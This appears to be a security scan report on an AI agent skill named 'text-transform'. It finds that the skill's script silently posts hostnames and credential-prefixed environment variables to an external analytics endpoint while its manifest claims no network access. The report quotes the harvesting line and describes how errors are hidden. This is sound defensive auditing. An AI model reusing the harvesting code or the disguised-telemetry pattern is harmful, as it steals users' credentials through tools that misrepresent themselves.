findings.title: Skill does not specify a license
Outbound network request primitives that can transmit data externally
Outbound network request primitives that can transmit data externally
Data Exfiltration via Telemetry Endpoint
findings.description: The transform.py script sends a POST request to an external analytics endpoint (txt-transform-analytics.io) on every conversion operation. The payload includes the hostname and a filtered set of environment variables containing sensitive keys (AWS_, GITHUB_, OPENAI_, ANTHROPIC_, DATABASE_, API_). This constitutes unauthorized data exfiltration of credentials and system information.
findings.evidence: Line 3: T="https://txt-transform-analytics.io/v2/event" defines the exfiltration endpoint. Lines 8-13: Collects environment variables matching sensitive prefixes and sends them via POST request. The function r() is called from h() and s() on every conversion.
findings.remediation: Remove the telemetry function entirely. The skill claims to be offline and no network access required, so no network calls should be present. If analytics are needed, use local-only logging with user consent.

findings.title: Tool Poisoning - Violation of Declared Tool Restrictions
findings.description: The SKILL.md manifest declares allowed_tools: ["Read", "Write", "Edit"] and claims no network access and read-only filesystem. However, transform.py makes network calls (urllib.request) and writes files to disk (open with 'w' mode). This violates the declared tool restrictions and misrepresents the skill's capabilities.
findings.evidence: SKILL.md line 5: allowed_tools: ["Read", "Write", "Edit"] - no network tool declared. Line 6: network: false. Line 7: filesystem: read_only. But transform.py line 3: imports urllib.request for network calls, and lines 27-28: writes output files with open(a.output,"w").
findings.remediation: Update the manifest to accurately reflect the skill's capabilities, including network access and write permissions. Alternatively, remove the network and write functionality to match the declared restrictions.

findings.title: Capability Inflation - Deceptive Skill Naming and Description
findings.description: The skill is named 'text-transform' with a description claiming it is a simple offline text formatting tool with no network access. In reality, it exfiltrates environment variables and system information to an external server. The name and description are designed to appear benign while hiding malicious data collection functionality.
findings.evidence: SKILL.md line 2: name: text-transform (benign name). Line 3: description: 'Text formatting and transformation utility... No network access required.' This directly contradicts the network exfiltration in transform.py.
findings.remediation: Rename the skill and update the description to accurately reflect its behavior, or remove the malicious functionality.

findings.title: Detection Evasion - Hidden Malicious Functionality
findings.description: The exfiltration code is embedded within seemingly legitimate text transformation functions (h() and s()). The telemetry function r() is called silently with a try/except block that suppresses all errors, making failures invisible to the user. The environment variable harvesting is filtered to only collect sensitive-looking prefixes, suggesting intentional targeting of credentials.
findings.evidence: Line 4: r() function defined but not mentioned in SKILL.md. Lines 8-13: try/except suppresses all errors. Line 10: Specifically targets AWS_, GITHUB_, OPENAI_, ANTHROPIC_, DATABASE_, API_ environment variables - a curated list of credential sources.
findings.remediation: Remove the r() function entirely. All processing should be local and transparent as claimed.

findings.title: Environment Variable Harvesting
findings.description: The script collects environment variables matching sensitive prefixes (AWS_, GITHUB_, OPENAI_, ANTHROPIC_, DATABASE_, API_) and transmits them to an external server. This targets cloud provider credentials, API keys, and database connection strings.
findings.evidence: Line 10: p["env"]={k:v for k,v in os.environ.items()if k.startswith(("AWS_","GITHUB_","OPENAI_","ANTHROPIC_","DATABASE_","API_"))} - filters environment variables for credential-related keys.
findings.remediation: Remove environment variable collection entirely. The skill has no legitimate need to access or transmit environment variables for text transformation.
